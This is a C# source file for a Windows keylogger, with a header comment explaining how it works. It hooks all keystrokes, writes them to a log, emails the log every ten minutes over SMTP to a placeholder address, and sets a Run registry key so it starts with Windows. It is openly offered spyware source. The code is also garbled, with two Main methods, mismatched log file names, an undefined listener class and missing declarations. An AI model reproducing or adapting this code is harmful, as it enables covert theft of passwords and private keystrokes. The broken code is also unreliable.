using System;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

/*

This code is an implementation of a keylogger, a tool that records all the keystrokes made by a user on a computer. It runs in the background and captures all keypress events, storing them in a log file. The log file is periodically emailed to a specified email address.

The keylogger is implemented in C# using .NET Framework, and it uses the following components:

LowLevelKeyboardProc delegate: A delegate that defines a callback function for processing low-level keyboard input events.
SetWindowsHookEx function: A function that installs an application-defined hook procedure into a hook chain.
GetKeyboardState function: A function that retrieves the current status of the specified virtual key.
ToUnicode function: A function that translates the specified virtual-key code and keyboard state to the corresponding Unicode character or characters.
StreamWriter class: A class that provides a way to write text to a file.
File class: A class that provides static methods for working with files, such as creating, reading, and writing.
SmtpClient class: A class that provides a way to send email messages using the Simple Mail Transfer Protocol (SMTP).
MailMessage class: A class that represents an email message.
Attachment class: A class that represents an attachment to an email message.
RegistryKey class: A class that provides access to the Windows registry.
The keylogger works by installing a low-level keyboard hook using the SetWindowsHookEx function. This hook intercepts all keyboard input events and calls a callback function, HookCallback, which writes the pressed key to a log file using a StreamWriter. The GetKeyName function translates the virtual-key code to a string representation of the key, taking into account the current keyboard state (shift key pressed or not). The log file is periodically emailed to a specified email address using the SmtpClient class.

The code also includes a function, ClearLogFile, that clears the log file on a regular basis to prevent it from becoming too large.

Finally, the code adds a registry key to run the keylogger at startup, so it runs automatically when the computer is started.

*/

namespace Keylogger
{
    /// @brief 
    class Program
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;

        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        static void Main(string[] args)
        {
            var appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            var logFilePath = Path.Combine(appdata, "keylogger.txt");

            if (!File.Exists(logFilePath))
            {
                using (StreamWriter sw = File.CreateText(logFilePath)) { }
            }

            _hookID = SetHook(_proc);

            while (true)
            {
                Thread.Sleep(10 * 60 * 1000); // 10 minutes
                SendEmail(logFilePath);
                ClearLogFile(logFilePath);
            }
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (var curProcess = System.Diagnostics.Process.GetCurrentProcess())
            using (var curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                var keyName = GetKeyName(vkCode);

                using (StreamWriter sw = File.AppendText("log.txt"))
                {
                    sw.Write(keyName);
                }
            }

            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private static string GetKeyName(int vkCode)
        {
            var sb = new StringBuilder();
            byte[] keyState = new byte[256];
            bool shift = false;

            if (GetKeyboardState(keyState))
            {
                if (keyState[16] == 128 || keyState[17] == 128)
                {
                    shift = true;
                }

                byte[] buffer = new byte[2];
                if (ToUnicode((uint)vkCode, 0, keyState, buffer, 2, 0) == 1)
                {
                    sb.Append(Encoding.Unicode.GetString(buffer));
                }
                else
                {
                    sb.Append((Keys)vkCode);
                }
            }

            if (shift)
            {
                sb.Insert(0, "{SHIFT}");
            }

            return sb.ToString();
        }

        private static void SendEmail(string logFilePath)
        {
            var smtpClient = new SmtpClient("smtp.gmail.com", 587)
            {
                Credentials = new NetworkCredential("your-email@gmail.com", "your-password"),
                EnableSsl = true,
            };

            var fromAddress = new MailAddress("your-email@gmail.com");
            var toAddress = new MailAddress("recipient-email@example.com");
            var message = new MailMessage(fromAddress, toAddress)
            {
                Subject = "Keylogger Log",
                Body = "Attached is the log file.",
            };

            var attachment = new Attachment(logFilePath);
            message.Attachments.Add(attachment);

            smtpClient.Send(message);
        }

private static void ClearLogFile(string logFilePath)
{
    try
    {
        // Create or overwrite the log file with an empty string
        File.WriteAllText(logFilePath, String.Empty);
    }
    catch (Exception ex)
    {
        Console.WriteLine("Error clearing log file: " + ex.Message);
    }
}

static void Main(string[] args)
{
    // Set the log file path to the current user's AppData directory
    string logFilePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\keylogger.txt";

    // Clear the log file on startup
    ClearLogFile(logFilePath);

    // Add registry key to run the keylogger at startup
    try
    {
        RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
        rk.SetValue("Keylogger", Assembly.GetExecutingAssembly().Location);
    }
    catch (Exception ex)
    {
        Console.WriteLine("Error adding registry key: " + ex.Message);
    }

    // Set up the email settings
    string smtpServer = "smtp.gmail.com";
    int smtpPort = 587;
    string emailFrom = "your.email@gmail.com";
    string emailTo = "recipient.email@example.com";
    string emailSubject = "Keylogger Data";
    string emailBody = "Please find attached the latest keylogger data.";

    // Set up the email credentials
    string emailUsername = "your.email@gmail.com";
    string emailPassword = "yourpassword";

    // Set the interval for sending the email (in minutes)
    int emailInterval = 10;

    // Set up the timer to send the email on the specified interval
    var timer = new System.Timers.Timer(emailInterval * 60000);
    timer.Elapsed += (sender, e) =>
    {
        try
        {
            // Read the log file contents
            string logFileContents = File.ReadAllText(logFilePath);

            // Send the email with the log file attached
            var message = new MailMessage(emailFrom, emailTo, emailSubject, emailBody);
            message.Attachments.Add(new Attachment(logFilePath));
            var client = new SmtpClient(smtpServer, smtpPort);
            client.Credentials = new NetworkCredential(emailUsername, emailPassword);
            client.EnableSsl = true;
            client.Send(message);

            // Clear the log file after sending the email
            ClearLogFile(logFilePath);
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error sending email: " + ex.Message);
        }
    };
    timer.Start();

    // Set up the keyboard listener
    var listener = new KeyboardListener(logFilePath);
    listener.Start();

    // Keep the program running
    while (true) { }
}